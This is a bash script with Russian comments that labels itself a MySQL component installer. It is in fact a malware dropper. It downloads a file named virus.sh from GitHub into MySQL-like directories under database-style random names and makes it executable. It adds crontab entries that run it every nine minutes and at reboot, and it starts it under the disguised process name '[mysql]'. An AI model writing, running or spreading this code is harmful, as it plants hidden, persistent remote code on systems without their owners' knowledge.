GITHUB_SCRIPT_URL="https://github.com/Zend1X/virus/blob/main/virus.sh"
MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysqld" "/var/lib/mysql")

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

print_error() {
    echo -e "${RED}[✗] $1${NC}"
}

print_info() {
    echo -e "${YELLOW}[i] $1${NC}"
}

generate_name() {
    PREFIXES=("ibdata" "ib_logfile" "mysql-bin" "undo" "redo" "ibtmp" "binlog" "relay-log" "mysql" "innodb")
    RANDOM_PREFIX=${PREFIXES[$RANDOM % ${#PREFIXES[@]}]}
    RANDOM_NUMBER=$((RANDOM % 10000))
    GENERATED_NAME="${RANDOM_PREFIX}${RANDOM_NUMBER}"
    print_success "Сгенерировано имя: $GENERATED_NAME"
    echo "$GENERATED_NAME"
}

find_dir() {
    print_info "Поиск доступной директории MySQL..."
    
    for dir in "${MYSQL_DIRS[@]}"; do
        if mkdir -p "$dir" 2>/dev/null; then
            if [ -w "$dir" ]; then
                print_success "Найдена доступная директория: $dir"
                echo "$dir"
                return 0
            else
                print_error "Нет прав на запись в директорию: $dir"
            fi
        else
            print_error "Не удалось создать директорию: $dir"
        fi
    done
    
    print_info "Используем директорию по умолчанию: /tmp/mysql"
    mkdir -p "/tmp/mysql" 2>/dev/null
    echo "/tmp/mysql"
}

process() {
    print_info "Запуск процесса с маскировкой под [mysql]..."
    
    if exec -a "[mysql]" "$SCRIPT_PATH" 2>/dev/null & then
        PROCESS_PID=$!
        if kill -0 $PROCESS_PID 2>/dev/null; then
            print_success "Процесс успешно запущен с PID: $PROCESS_PID"
        else
            print_error "Процесс запущен, но не отвечает"
        fi
    else
        print_error "Не удалось запустить процесс"
    fi
}

main() {
    echo "==================================="
    echo "    Установка MySQL компонентов    "
    echo "==================================="
    
    MYSQL_DIR=$(find_dir)
    RANDOM_NAME=$(generate_name)
    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"
    
    print_info "Путь к скрипту: $SCRIPT_PATH"
    
    # Проверка наличия в crontab
    print_info "Проверка наличия задачи в crontab..."
    if crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        print_success "Задача уже существует в crontab"
    else
        print_info "Загрузка скрипта с GitHub..."
        if curl -s --fail "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"; then
            print_success "Скрипт успешно загружен"
            
            chmod +x "$SCRIPT_PATH"
            if [ -x "$SCRIPT_PATH" ]; then
                print_success "Права на выполнение установлены"
            else
                print_error "Не удалось установить права на выполнение"
            fi
            
            # Добавление в crontab
            print_info "Добавление задач в crontab..."
            (crontab -l 2>/dev/null
            echo "*/9 * * * * $SCRIPT_PATH >/dev/null 2>&1"
            echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
            ) | crontab -
            
            if [ $? -eq 0 ]; then
                print_success "Задачи успешно добавлены в crontab"
            else
                print_error "Не удалось добавить задачи в crontab"
            fi
        else
            print_error "Не удалось загрузить скрипт с GitHub"
        fi
    fi
    
    process
    
    print_success "Установка завершена"
    echo "==================================="
}

# Запуск основной функции с обработкой ошибок
if main; then
    print_success "Скрипт выполнен успешно"
else
    print_error "Ошибка выполнения скрипта"
    exit 1
fi
